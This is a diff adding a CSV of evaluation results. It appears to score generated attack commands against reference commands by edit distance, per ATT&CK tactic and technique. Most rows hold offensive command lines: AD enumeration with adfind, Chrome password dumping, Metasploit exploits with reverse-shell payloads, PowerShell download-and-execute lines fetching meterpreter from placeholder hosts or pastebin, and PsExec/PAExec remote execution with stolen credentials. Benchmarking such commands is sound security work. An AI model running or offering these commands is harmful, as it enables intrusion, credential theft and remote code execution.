@@ -1,0 +1,48 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitedmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.485,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc sitelinkdmp:<site_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.463,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc subnetdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.471,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc gpodmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.431,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc fspdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.462,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc oudmp,"adfind -f ""(objectcategory=group)""`",0.471,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc dcdmp,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.438,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc fo:<object_name>,"adfind -f ""(objectcategory=group)""`",0.548,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc kids:<dn>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.412,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc u:<user_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.417,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc userinfo:<user_name>,`adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt`,0.43,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc g:<group_name>,"adfind -f ""(objectcategory=group)""`",0.5,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sc c:<computer_name>,`adfind.exe -f (objectcategory=computer) > ad_computers.txt`,0.477,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -daclpipe+ <object_dn>,"adfind -f ""(objectcategory=group)""`",0.469,True
+command_adfind_TA0007_T1016.txt,adfind,adfind -sddlpsflag <object_dn>,"adfind -f ""(objectcategory=group)""`",0.492,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.321,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -f <victim_chrome_profile_path>,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.25,True
+command_chrome_passwords_TA0005_T1078.txt,chrome passwords,chrome-passwords -p <stolen_username> <stolen_password> -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.313,True
+command_chrome_passwords_TA0007_T1087.txt,chrome passwords,chrome-passwords -c,"[meterpreter (PowerShell)\*] > `& ""chrome-passwords.exe""`",0.421,True
+command_metasploit_TA0001_T1190.txt,metasploit,"msfconsole -x ""use exploit/multi/http/... ; set RHOST 192.168.0.4 ; set RPORT 80 ; set PAYLOAD windows/meterpreter/reverse_tcp ; run""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.45,True
+command_metasploit_TA0003_T1543.txt,metasploit,"meterpreter > reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows"" /v ""RandomServiceName"" /t REG_SZ /d ""<random_service_name>""",[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,0.351,True
+command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/powershell_service; set PAYLOAD windows/powershell_reverse_tcp; set LHOST <attacker_IP>; set LPORT <attacker_port>; exploit""",`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 --format psh -o meterpreter.ps1`,0.493,True
+command_metasploit_TA0004_T1543.txt,metasploit,"msfconsole -x ""use windows/service/service_install; set SERVICE_NAME <service_name>; set SERVICE_DESCRIPTION <service_description>; set PATH_TO_SCRIPT <script_path>; exploit"""," ```
+    set payload windows/x64/meterpreter_reverse_https
+    set lport 80
+    set ExitOnSession False
+    exploit -j
+```",0.311,True
+command_metasploit_TA0005_T1027.txt,metasploit,msf6 > use exploit/http/foscam_rce,`msf> loot -t screenspy.screenshot`,0.406,True
+command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload linux http/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.516,True
+command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload windows http/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.585,True
+command_metasploit_TA0011_T1105.txt,metasploit,fetch_payload linux https/x64/meterpreter/reverse_tcp,[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.527,True
+command_metasploit_TA0011_T1105.txt,metasploit,curl -o <file_path> 'https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp',[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.418,True
+command_metasploit_TA0011_T1105.txt,metasploit,wget -O <file_path> 'http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp',[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.421,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",0.315,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('http://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.283,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://<SRVHOST>:<SRVPORT>/x64/meterpreter/reverse_tcp'))""",[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`,0.282,True
+command_metasploit_TA0011_T1105.txt,metasploit,"powershell -nop -w hidden -c ""iex ((New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/<paste_id>'))""","[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysinternalsSuite.zip""`",0.315,True
+command_paexec_TA0002_T1569.txt,paexec,PAExec \\<target_server> -u <username> -p <password> -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.418,True
+command_paexec_TA0005_T1036.txt,paexec,paexec -i -s mstdc," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.212,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -s cmd.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.198,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -i -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.351,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -l -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.351,True
+command_paexec_TA0008_T1021.txt,paexec,PAExec \\{server_IP_address} -u {username} -p {password} -h -c MyApp.exe," `cmd > paexec.exe \\<itadmin_ip> -s -u <domain>\<domain_admin> -p <domain_admin_password_hash> -c -csrc "".\hollow.exe"" hollow.exe  `",0.361,True
+command_psexec_TA0001_T1078.txt,psexec,psexec -i \\<remote_system> -u <attacker_username> -p <attacker_password>,"[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.342,True
